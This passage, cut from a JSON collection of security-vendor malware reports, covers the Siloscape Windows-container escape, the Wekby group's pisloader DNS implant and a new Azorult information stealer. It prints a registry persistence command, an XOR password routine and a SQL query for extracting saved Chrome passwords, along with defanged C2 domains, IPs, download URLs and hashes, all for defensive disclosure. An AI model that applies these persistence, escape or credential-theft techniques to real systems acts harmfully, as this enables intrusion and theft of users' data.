                "This led me to believe that Siloscape is being compiled uniquely for each new attack, using a unique pair of keys.",
                "The hardcoded key makes each binary a little bit different than the rest, which explains why I couldnt find its hash anywhere.",
                "It also makes it impossible to detect Siloscape by hash alone."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another interesting technique this malware uses is Visual Studios Resource Manager.",
                "This is a feature built into Visual Studio that allows one to attach basically any file to the original binary and get a pointer to its data with a few simple API calls.",
                "Siloscape uses this method to write the Tor archive to the disk, as well as the unzip binary used to open the archive.",
                "It also uses Tor to securely connect to its C2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One of the more interesting things about Siloscape is the way it escapes the container.",
                "To execute the system call NtSetInformationSymbolicLink that enables the escape, one must gain SeTcbPrivilege first.",
                "There are a few ways to do this.",
                "For example, in my tests, I injected a DLL into CExecSvc.exe, which has the relevant privileges, and executed NtSetInformationSymbolicLink from the CExecSvc.exe context.",
                "Siloscape, however, uses a technique called Thread Impersonation.",
                "This method has little documentation online and even fewer working examples.",
                "The most critical function for this technique is the undocumented system call NtImpersonateThread."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape mimics CExecSvc.exe privileges by impersonating its main thread and then calls NtSetInformationSymbolicLink on a newly created symbolic link to break out of the container.",
                "More specifically, it links its local containerized X drive to the hosts C drive."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After Siloscape creates a link to the host, it will search for two specific files: kubectl.exe and the Kubernetes config file, which normally exists on Kubernetes nodes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape searches for kubectl.exe by name and the config file using a regular expression.",
                "The search function takes an extra argument: a pointer to a vector that holds folder names to exclude from the search."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When it calls FindFile to search for the above files, it excludes the folders Program Files, Program Files (x86), Windows and Users.",
                "It does this to make the search faster and because it is unlikely the previously mentioned files are in those folders.",
                "If both files are found, their paths are saved to a global variable.",
                "If the files are not located, Siloscape exits, abandoning the attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After Siloscape finds everything it needs to execute kubectl commands, it continues to check if the compromised node actually has enough permissions to use for the attackers malicious activities.",
                "It does this by executing the kubectl command %ls auth can-i create deployments --kubeconfig=%ls where the strings in the format are replaced by the paths it saved earlier as global variables."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After getting everything it needs and checking that the compromised node is indeed capable of creating new deployments, Siloscape writes the Tor archive (ZIP) and an unzip binary to the hosts C drive.",
                "After extracting Tor, it launches tor.exe to a new thread and waits for it to finish by checking the Tor thread output."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After Tor is up and running, Siloscape uses it to connect to its C2  an IRC server, using an onion address that was provided as a command line argument."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The server is password-protected.",
                "Siloscape uses its first command line argument to decrypt the password by a simple byte by byte XOR.",
                "The following is a simplified version of the C2 servers password decryption:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "char hardCodedXor[32] = \"HARD_CODED_32_LONG_STRING\"; \nchar ircPass[32] = { 0 }; \nfor (int i = 0; i < 32; i++) \n  ircPass[i] = hardCodedXor[i] ^ argv[1][i];"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once successfully connected to the IRC server, it issues a JOIN #WindowsKubernetes command to join the WindowsKubernetes IRC channel and then idles there."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape allows two types of instructions, one for kubectl supported commands and one for regular Windows cmd commands."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It waits for a private message.",
                "If one from a user named admin is received, Siloscape follows the following logic:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After I reversed the malware, especially the part that handles the C2, I wanted to discover whether this campaign was still up and running."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "I set up a brand new virtual machine, downloaded Tor and started looking for an IRC client that supports SOCKS5, the proxy protocol that is needed in order to connect through Tor.",
                "IRC is a very old protocol and is less popular today than it was 20 years ago.",
                "Furthermore, IRC came out almost a decade before SOCKS5.",
                "I found HexChat, a simple, lightweight IRC client that supports both SOCKS5 and connecting to onion domains."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When our Silospace sample was originally executed, its command line argument for the IRC username was php_35, so I decided to use this username when connecting to the C2 server from HexChat, thinking it would appear legitimate to the attacker."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "I connected to the server and discovered it was still working.",
                "I joined #WindowsKubernetes just like Siloscape does.",
                "There were 23 active victims there and a channel operator named admin."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unfortunately, after about two minutes, I was noticed and kicked out of the server.",
                "Two minutes after that, the server was no longer active  at least not at the original onion domain I used."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When I went over my findings, the first thing that came to mind is that there were many more active users on the C2 server than I actually saw in the #WindowsKubernetes channel  313 users in total, to be exact.",
                "This implies that the Siloscape malware was just a small part of a bigger campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sadly, when I connected to the server, the channels list was empty, indicating that the server was configured to not reveal its channels.",
                "Therefore, I couldnt get more information from the channel names."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The second and more important detail that stood out was the convention used for the victims names.",
                "Our name was php_35, and when our sample of Siloscape first executed, it indeed was executed through a vulnerable php instance.",
                "The other names clearly suggest the way the attacker managed to achieve code execution (sqlinj probably means SQL injection):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "@admin sqlinj_64 sqlinj_51",
                "php_34 weblogic_12 sqlinj_138 weblogic_19 php_66 sqlinj_87 sqlinj_8 sqlinj_33 sqlinj_114",
                "activemq_5",
                "sqlinj_44 tomcat_9 sqlinj_52 sqlinj_107",
                "redis_10 php_76 sqlinj_28 activemq_25 sqlinj_35 php_8 weblogic_31 php_35"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The last piece of information I was able to obtain from the C2 is the creation date of the server: Jan. 12, 2020.",
                "Note that this doesnt necessarily mean that Siloscape was created on that date.",
                "Instead, its likely the campaign started at that time."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike most cloud malware, which mostly focuses on resource hijacking and denial of service (DoS), Siloscape doesnt limit itself to any specific goal.",
                "Instead, it opens a backdoor to all kinds of malicious activities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As discussed in my last article, users should follow Microsofts guidance recommending not to use Windows containers as a security feature.",
                "Microsoft recommends using strictly Hyper-V containers for anything that relies on containerization as a security boundary.",
                "Any process running in Windows Server containers should be assumed to have the same privileges as admin on the host, which in this case is the Kubernetes node.",
                "If you are running applications in Windows Server containers that need to be secured, we recommend moving these applications to Hyper-V containers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Furthermore, administrators should make sure their Kubernetes cluster is securely configured.",
                "In particular, a secured Kubernetes cluster wont be as vulnerable to this specific malware as the nodes privileges wont suffice to create new deployments.",
                "In this case, Siloscape will exit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape shows us the importance of container security, as the malware wouldnt be able to cause any significant damage if not for the container escape.",
                "It is critical that organizations keep a well-configured and secured cloud environment to protect against such threats."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Existing Prisma Cloud capabilities will successfully detect and mitigate the Siloscape malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Prisma Clouds Runtime Protection feature learns the machines behavior and creates a set of rules for processes.",
                "Once the learning is complete, the user can choose the action for new, unexpected processes attempting to execute.",
                "The user can choose to alert, prevent or completely block the execution."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 Discovers First Known Malware Targeting Windows Containers"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Webinar: Unit 42 researchers will cover the details of Siloscape live."
            ]
        }
    ],
    "9aca60d954eb7265909ba1473ad33a6d78a573eb": [
        {
            "type": "paragraph",
            "content": [
                "We have observed an attack led by the APT group Wekby targeting a US-based organization in recent weeks.",
                "Wekby is a group that has been active for a number of years, targeting various industries such as healthcare, telecommunications, aerospace, defense, and high tech.",
                "The group is known to leverage recently released exploits very shortly after those exploits are available, such as in the case of HackingTeams Flash zero-day exploit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware used by the Wekby group has ties to the HTTPBrowser malware family, and uses DNS requests as a command and control mechanism.",
                "Additionally, it uses various obfuscation techniques to thwart researchers during analysis.",
                "Based on metadata seen in the discussed samples, Palo Alto Networks has named this malware family pisloader."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The pisloader malware family was delivered via HTTP from the following URL.",
                "At the time of writing, this URL was still active."
            ]
        },
        {
            "type": "caption",
            "content": [
                "http://globalprint-us[.]com/proxy_plugin.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Other samples hosted on this domain include the following:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "http://globalprint-us[.]com/proxy_web_plugin.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: E4968C8060EA017B5E5756C16B80B012\nSHA256: 8FFBB7A80EFA9EE79E996ABDE7A95CF8DC6F9A41F9026672A8DBD95539FEA82A\nSize: 126976 Bytes\nCompile Time: 2016-04-28 00:38:46 UTC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This discovered file was found to be an instance of the common Poison Ivy malware family with the following configuration data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Command and Control Address: intranetwabcam[.]com\nCommand and Control Port: 80\nPassword: admin\nMutex: )!VoqA.I5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The domains witnessed in this attack were all registered very shortly prior to being used.",
                "The following domains have been witnessed in this attack:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following IP resolutions have been observed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following sample was discovered initially and is referenced in the subsequent analysis:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: E8D58AA76DD97536AC225949A2767E05\nSHA256: DA3261C332E72E4C1641CA0DE439AF280E064B224D950817A11922A8078B11F1\nSize: 126976 Bytes\nCompile Time: 2016-04-27 14:37:34 UTC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This particular file has the following metadata properties.",
                "The references to pisload2 led to the naming of this malware family."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 pisloader dropper metadata"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial dropper contains very simple code that is responsible for setting persistence via the Run registry key, and dropping and executing an embedded Windows executable.",
                "Limited obfuscation was encountered, where the authors split up strings into smaller sub-strings and used strcpy and strcat calls to re-build them prior to use.",
                "They also used this same technique to generate garbage strings that are never used.",
                "This is likely to deter detection and analysis of the sample.",
                "The following decompiled code demonstrates this.",
                "Comments have been added to show the fully-generated strings."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 pisloader dropper building strings and setting persistence"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above decompiled code, we see that the pisloader is generating the following string, which eventually is called to set the Run registry key."
            ]
        },
        {
            "type": "caption",
            "content": [
                "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lsm /t",
                "reg_sz /d",
                "\"%appdata%\\lsm.exe\" /f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This particular command will set the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\lsm registry key with a value of %appdata%\\lsm.exe.",
                "After this key is set, the malware proceeds to decrypt a two blobs of data with a single-byte XOR key of 0x54.",
                "The resulting data is written to the %appdata%\\lsm.exe file path."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this file is written, the malware executes the newly written lsm.exe file, which contains the pisloader payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following sample was discovered and is referenced in the subsequent analysis:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 07B9B62FB3B1C068837C188FEFBD5DE9\nSHA256: 456FFFC256422AD667CA023D694494881BAED1496A3067485D56ECC8FEFBFAEB\nSize: 102400 Bytes\nCompile Timestamp: 2016-04-27 13:39:02 UTC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload is heavily obfuscated using a return-oriented programming (ROP) technique, as well as a number of garbage assembly instructions.",
                "In the example below, code highlighted in red essentially serves no purpose other than to deter reverse-engineering of the sample.",
                "This code can be treated as garbage and ignored.",
                "The entirety of the function is highlighted in green, where two function offsets are pushed to the stack, followed by a return instruction.",
                "This return instruction will point code execution first at the null function, which in turn will point code execution to the next_function.",
                "This technique is used throughout the runtime of the payload, making static analysis difficult."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Obfuscated code witnessed in pisloader"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware is actually quite simplistic once the obfuscation and garbage code is ignored.",
                "It will begin by generating a random 10-byte alpha-numeric header.",
                "The remaining data is base32-encoded, with padding removed.",
                "This data will be used to populate a subdomain that will be used in a subsequent DNS request for a TXT record."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The use of DNS as a C2 protocol has historically not been widely adopted by malware authors.",
                "Notable exceptions include the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The use of DNS as a C2 allows pisloader to bypass certain security products that may not be inspecting this traffic correctly."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 DNS query for TXT record by malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The pisloader sample will send a beacon periodically that is composed of a random 4-byte uppercase string that is used as the payload.",
                "An example of this can be found below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 pisloader DNS beacon request"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware expects various aspects of the DNS responses to be set in a specific way, or else pisloader will ignore the DNS reply.",
                "The following DNS flags must be set.",
                "Should any additional flags be set, the response will be ignored."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Questions field must be set to a value of 0x1.",
                "The Answer Resource Records field must be set to a value of 0x1.",
                "Additionally, the response query subdomain must match the original DNS request."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The remote command and control (C2) server is statically embedded within the malware.",
                "A single host of ns1.logitech-usa[.]com is found in this specific sample."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server will respond with a TXT record that is encoded similar to the initial request.",
                "In the response, the first byte is ignored, and the remaining data is base32-encoded.",
                "An example of this can be found below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Example TXT response by C2 server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following commands, and their descriptions are supported by the malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Some examples of these commands being used can be seen below.",
                "A mock DNS server was used to generate the commands and receive the resulting data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example sending the drive command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example sending the open command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example sending the sifo command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example listing the contents of the C:\\ drive:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sifo command above uses the printf format string of l=%s&c=%s&o=%s.",
                "This is consistent with previous versions of HTTPBrowser, which is another malware family frequently used by the Wekby group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, a number of commands themselves, such as the list, drive, and upload commands are consistent with HTTPBrowser.",
                "The formatted responses from these commands are also identical.",
                "A known HTTPBrowser sample was spotted with similar metadata as the discussed pisloader sample, which adds further credibility that pisloader is likely a variant of this malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the code used to generate these commands is available via GitHub."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Wekby group continues to target various high profile organizations using sophisticated malware.",
                "The pisloader malware family uses various novel techniques, such as using DNS as a C2 protocol, as well as making use of return-oriented programming and other anti-analysis tactics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected against this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "External Resources"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "da3261c332e72e4c1641ca0de439af280e064b224d950817a11922a8078b11f1\n930772d6af8f43f62ea78092914fa8d6b03e8e3360dd4678eec1a3dda17206ed\n6852ba95720af64809995e04f4818517ca1bd650bc42ea86d9adfdb018d6b274\n9200f80c08b21ebae065141f0367f9c88f8fed896b0b4af9ec30fc98c606129b\n4d62caef1ca8f4f9aead7823c95228a52852a1145ca6aaa58ad8493e042aed16\n1b341dab023de64598d80456349db146aafe9b9e2ec24490c7d0ac881cecc094\n456fffc256422ad667ca023d694494881baed1496a3067485d56ecc8fefbfaeb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domains"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns1.logitech-usa[.]com\nglobalprint-us[.]com\nintranetwabcam[.]com\nlogin.access-mail[.]com\nglb.it-desktop[.]com\nlocal.it-desktop[.]com\nhi.getgo2[.]com"
            ]
        }
    ],
    "7c1954eed62d49faa7d648644610c30433cfae53": [
        {
            "type": "paragraph",
            "content": [
                "Overview"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Observed in the wild as early as 2016, Azorult is a Trojan family which has been delivered in malicious macro-based documents via spam campaigns, or as a secondary payload in the RIG Exploit Kit campaigns.",
                "On October 20th, 2018 we discovered that new Azorult variants were being used as primary payloads in a new ongoing campaign using the Fallout Exploit Kit.",
                "We named this campaign FindMyName because all of the final exploit pages land on the domain findmyname[.]pw.",
                "These new Azorult samples variants use advanced obfuscation techniques, such as API flooding and control flow flattening, to evade anti-virus products.",
                "Also, we discovered that Azorult has further evolved, the samples we captured support stealing sensitive information in more browsers, applications, and cryptocurrency wallets than previous versions."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this blog we will cover the FindMyName campaign, the new Azorult malware, and the obfuscation techniques used."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First stage of FindMyName Campaign"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "October 20th is when we first observed the new campaign we are dubbing FindMyName.",
                "In the following 3 days, 5 different URL chains, listed in appendix 1, led to the delivery of the Fallout Exploit Kit.",
                "All 5 different URL chains redirected victims to one domain, findmyname[.]pw."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The steps in the first stage of FindMyName campaign are shown in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Overview of the first stage of the attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although the 5 final pages in findmyname[.]pw were different, the content of them were similar.",
                "An example of the Fallout Exploit Kit landing page is shown in Figure 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 obfuscated landing page"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Fallout Exploit Kit uses several html tags such as span, h3, and p to hide the real exploit code with highly obfuscated tag content.",
                "After decryption, the real VBScript code exploits an IE VBScript vulnerability CVE-2018-8174 which was patched in August."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Exploit code snippet of CVE-2018-8174 in Fallout Exploit Kit"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the exploit succeeds, this Fallout Exploit Kit downloads a .tmp file to the %Temp% directory and calls CreateProcess to execute it.",
                "Further analysis revealed that the .tmp file was the latest variant of Azorult malware.",
                "It was the first time weve seen the new variant of Azorult malware used as primary payload for Fallout Exploit Kit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Second stage of FindMyName Campaign"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this section, we focus on analyzing the latest variant of Azorult malware we captured."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malware Analysis Overview"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Azorult malware family is a commercial Trojan sold on underground forums.",
                "We observed 3 new variants of Azorult malware in the recent FindMyName campaign.",
                "When we discovered them, 2 of the 3 samples had not been seen in the wild yet.",
                "One of the new Azorult samples we captured and analyzed has the following malicious features (some of these features are explained in detail in the next section):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "API Flooding and Control Flow Flattening Obfuscation"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial Azorult malware was written in Microsoft Visual C++ 7.0.",
                "First, the Azorult malware attempted to use control flow flattening obfuscation to thwart reverse engineering analysis as shown in Figure 4. Second, the sample used an API Flooding technique as shown in Figure 5. API Flooding is a malware technique to evade anti-virus emulators.",
                "For timely performance concerns, anti-virus emulators set a timer when emulating the executable file on the host machine.",
                "If the emulator emulates hundreds of time consuming functions, the emulator times out and marks the file as benign."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 control flow flatten"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 API flooding"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Process Hollowing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Azorult uses a process hollowing technique to build the new malware image.",
                "First, the sample decrypts the payload in the memory.",
                "Then the sample creates a new suspended process of itself.",
                "The sample then injects a decrypted payload to the new process.",
                "Lastly, the sample resumes new process execution andexhibits malicious behaviors.",
                "The overview of the sample execution is shown in Figure 6."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Sample process hollowing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C2 Communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The new trojan file dumped from the process was coded in the Delphi language.",
                "When the sample executes, it immediately connects to a C2 server for further instructions.",
                "In order to evade Intrusion Prevention Systems (IPS), the C2 traffic is obfuscated.",
                "The data sent back to the C2 includes a unique victim ID for each victims machine by encoding the machine GUID , Windows product name, user name and computer name with hash algorithm.",
                "Then the malware decrypts a C2 address and sends a POST request to 51[.]15[.]196[.]30/1/index.php with the encrypted victims ID.",
                "The C2 traffic is shown in Figure 7.",
                "The detailed example about hash algorithm and encryption is listed in Appendix 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 C2 request"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample decrypts and validates the C2 response.",
                "The decrypted C2 content had three parts.",
                "The part contained inside the <n></n> tags contains 48 legit DLLs which are used for information stealing, described in the following sections.",
                "The part inside the <d></d> tags contains application information for information stealing: application path, related registry and credential file names.",
                "The part in the <c></c> tags contains a C2 configuration for the sample.",
                "The C2 configuration is shown in Figure 8.",
                "According to pcap analysis, we identified the following characters checked by this sample."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 C2 configuration"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malicious functions specified by C2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9 shows an example of C2 configuration for stealing sensitive information from Firefox and Thunderbird."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 C2 configuration for information stealing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The overview of C2 traffic is shown in Figure 10."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10 C2 traffic overview"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Information stealer"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample stole credentials and user data from thirty-two browsers including Chrome, Firefox and Qihoo 360.",
                "The full list of browsers is in Appendix 2.",
                "To steal credentials from browsers, the sample downloaded 48 legitimate dll files from C2 response to %AppData%\\Local\\Temp\\2fda folder as shown in Figure 11."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 11 legit dll files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The purpose of this action is to load nss3.dll and load the following functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlite3_open"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlite3_close"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlite3_prepare_v2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlite3_step"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlite3_column_text"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlite3_finalize"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NSS_Init"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PK11_GetInternalKeySlot"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PK11_Authenticate"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PK11SDR_Decrypt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NSS_Shutdown"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PK11_FreeSlot"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These functions are used to dump sensitive browser information.",
                "For example, the malware tried to use sqlite3_* functions to get the Firefox browser history information as shown in figure 12."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12 steal Firefox sensitive information using APIs in nss3.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Here is another example of a user name and password being stolen, this time from saved Chrome data.",
                "The sample searched the path %LOCALAPPDATA%\\Google\\Chrome\\User",
                "Data\\ for file \"Login Data\".",
                "If found, the sample copies the \"Login Data\" file to the %AppData%\\Local\\Temp directory and called sqlite3_prepare_v2 function from nss3.dll to exfiltrate credentials with SQL query: \"SELECT origin_url, username_value, password_value FROM logins\" as shown in Figure 13."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 13 select strings for stealing browser credentials"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware also withdrawals cookies, bookmarks, and autofill information from the aforementioned browsers.",
                "Credential information is saved to PasswordsList.txt and cookies are saved to CookieList.txt."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the sample steals the following cryptocurrency wallets:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Th malware tries to find the specified file including sensitive information of cryptocurrency wallets.",
                "For example the sample tried to find and send mbhd.wallet.aes file located in Coins\\MultiBitHD as shown in Figure 14."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 14 steal cryptocurrency wallets"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample steals credentials and user data from popular applications including Thunderbird, FileZilla, Outlook, WinSCP, Skype, Telegram and Steam.",
                "It also steals files from the Desktop.",
                "For example, the sample tries to find D877F783D5*.map* file under %appdata%\\Telegram Desktop\\tdata directory to steal sensitive information from Telegram as shown in Figure 15."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 15 steal applications credentials"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample collects the user information including current processes, installed software, system language and time zone.",
                "The harvested credentials and user information are then sent back to the C2.",
                "Here are some highlights about system information stealing."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 16 capture screen"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All information gathered by the malware is shown in figure 17."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 17 information gathered by malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Execute File Specified by Malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacker can remotely control the infected system to execute any file through Create Process or ShellExecute as shown in Figure 18.",
                "We also observed that it had the behavior of accessing a malicious URL to get the file: plugin-update[.]space/download/10.17.18.exe."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 18 call CreateProcess or ShellExecute to execute the file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This new variant of Azorult also has the capability to execute malware with local system privileges.",
                "It will check the current SID and token by following logic as shown in Figure 19:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 19 Check SID and token"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 20 create process as local system privilege"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Erasing Hints and Deleting Files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also found that the malware erases all of the files located in %temp%\\2fda and deletes files according to the C2s command as shown in Figure 21 and Figure 22."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 21 Erasing Hints of Infection"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 22 delete files according C2 command"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A presumed new campaign surfaced in late October that caught our attention.",
                "In the span of 3 days, 5 Fallout Exploit Kit URL chains were observed, all landing on an exploit page hosted on domain findmyname[.]pw.",
                "There is a new variant of Azorult malware found to be used as a payload for Fallout Exploit Kit.",
                "It has updated features compared to the previous versions and supports stealing from more software and cryptocurrency wallets than ever before."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Organizations with up-to-date Windows hosts have a much lower risk of infection.",
                "Palo Alto Networks customers are further protected from this threat.",
                "Our threat prevention platform detects both Fallout exploit kit and Azorult malware.",
                "AutoFocus users can track this activity using the AzoRult tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOCs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL Chains"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "URL chain 1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://sax[.]peakonspot[.]com/dep.php?pid=6639&format=POPUP&subid=&cid=M2018102013-11642b318a12196b7fae1559b32a45c2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://gfobhk[.]peak-serving[.]com/?&id=15400452977053288308437914&tid=6639&sr=ep"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://sp[.]popcash[.]net/go/161339/449201"
            ]
        },
        {
            "type": "paragraph",
            "content": [
